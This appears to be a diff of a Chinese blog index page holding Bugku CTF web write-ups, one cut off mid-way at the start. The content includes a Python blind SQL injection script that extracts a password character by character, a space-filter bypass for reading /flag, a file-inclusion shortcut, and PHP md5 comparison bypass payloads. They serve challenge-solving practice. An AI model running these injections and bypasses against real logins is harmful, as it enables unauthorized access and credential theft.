&#x3D; &quot;&quot;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    payload1 &#x3D; &quot;admin&#39;^(length(passwd)&#x3D;&quot; + str(i) + &quot;)^&#39;&quot;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &#39;uname&#39;: payload1,</span><br><span class="line">        &#39;passwd&#39;: &#39;123&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">    if &quot;username error!!@_@&quot; in r.text:</span><br><span class="line">        print(&quot;密码的长度是&quot;+str(i))</span><br><span class="line">        break</span><br><span class="line">for i in range(1, 33):</span><br><span class="line">    for j in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">        payload &#x3D; &quot;admin&#39;-(ascii(mid((passwd)from(&quot; + str(i) + &quot;)))&#x3D;&quot; + str(ord(j)) + &quot;)-&#39;&quot;</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">        &#39;uname&#39;: payload,</span><br><span class="line">        &#39;passwd&#39;: &#39;123&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">        #print(r.content)</span><br><span class="line">        if &quot;username error!!@_@&quot; in r.text:</span><br><span class="line">            password +&#x3D; j</span><br><span class="line">            print(password)</span><br><span class="line">            break</span><br><span class="line">print(&quot;密码是&quot;+password)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到一串md5，解码出来是<code>bugkuctf</code>,猜出密码是admin，直接登录</p>
+<p>shell界面上，发现过滤了空格，读取权限也不全，flag又不在当前文件夹，只能盲猜flag在根目录<br>所以<code>cat&lt;&gt;/flag</code>得到flag</p>
+<img src="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/1.PNG" class="" title="1.PNG">
+
 
       
 
@@ -849,7 +918,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/01/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/">展开全文 >></a>
         </p>
       
 
@@ -901,14 +970,14 @@
     </section>
   
   
-    <article id="post-bugku-web-备份是个好习惯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-需要管理员" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/">bugku-web-备份是个好习惯</a>
+      <a class="article-title" href="/2021/08/11/bugku-web-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98/">bugku-web-需要管理员</a>
     </h1>
   
 
@@ -916,23 +985,23 @@
         
 
 
-<a href="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/" class="archive-article-date">
-  	<time datetime="2021-08-01T03:58:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
+<a href="/2021/08/11/bugku-web-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98/" class="archive-article-date">
+  	<time datetime="2021-08-11T05:13:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开以后是一行类似md5的东西，随便查了一下，没查到东西<br>打开dirsearch扫目录，发现bak备份文件</p>
-<img src="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/1.PNG" class="" title="1.PNG">
-<p>打开后下载了一个记事本<br>得到源码——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017&#x2F;8&#x2F;6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line">$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+        <p>文字游戏题，没什么意思，评论区大佬说的很有道理：就考了一个目录扫描</p>
+<p>扫描出<code>/robots.txt</code></p>
+<img src="/2021/08/11/bugku-web-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98/1.PNG" class="" title="1.PNG">
 
-<p>$_SERVER[‘REQUEST_URI’]：获取url行的内容<br>strstr($_SERVER[‘REQUEST_URI’], ‘?’)：截取url中?后的内容（包括?）<br>substr($str,1)：从第二个字母开始截取$str<br>$str = str_replace(‘key’,’’,$str);：把$str中的key去除，可以用kekeyy来绕过<br>parse_str() — 将字符串解析成多个变量<br>d5($key1) == md5($key2) &amp;&amp; $key1 !== $key2：MD5加密后内容（首个字符）相同，原内容不同。可以用数组绕过（1）或md5碰撞（2）。</p>
-<p>法（1）：?kekey1y[]=1&amp;kekey2y[]=2(原理：md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的)<br>法（2）：?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a（原理：md5加密后开头都是0e）</p>
-<img src="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/2.PNG" class="" title="2.PNG">
-<img src="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/3.PNG" class="" title="3.PNG">
+<p>打开发现<code>/resusl.php</code></p>
+<img src="/2021/08/11/bugku-web-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98/2.PNG" class="" title="2.PNG">
+<img src="/2021/08/11/bugku-web-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98/3.PNG" class="" title="3.PNG">
+<p>说什么我的ip被记录都是吓人的，其实根本不需要改xff<br>然后就是根据标题的“管理员”猜出password是admin，然后x=admin出答案，没意思</p>
+<img src="/2021/08/11/bugku-web-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98/4.PNG" class="" title="4.PNG">
       
 
       
@@ -944,7 +1013,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/11/bugku-web-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98/">展开全文 >></a>
         </p>
       
 
@@ -996,14 +1065,14 @@
     </section>
   
   
-    <article id="post-bugku-web-好像需要密码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-文件包含-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/">bugku-web-好像需要密码</a>
+      <a class="article-title" href="/2021/08/11/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1/">bugku-web-文件包含</a>
     </h1>
   
 
@@ -1011,16 +1080,16 @@
         
 
 
-<a href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/" class="archive-article-date">
-  	<time datetime="2021-08-01T03:54:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
+<a href="/2021/08/11/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1/" class="archive-article-date">
+  	<time datetime="2021-08-11T05:07:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>没意思，纯爆破，浪费金币</p>
-<img src="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/1.PNG" class="" title="1.PNG">
+        <p>不知道出题人是不是来搞笑的，直接file=/flag就出来了</p>
+<img src="/2021/08/11/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1/1.PNG" class="" title="1.PNG">
       
 
       
@@ -1032,7 +1101,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/11/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1/">展开全文 >></a>
         </p>
       
 
@@ -1086,7 +1155,7 @@
   
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 
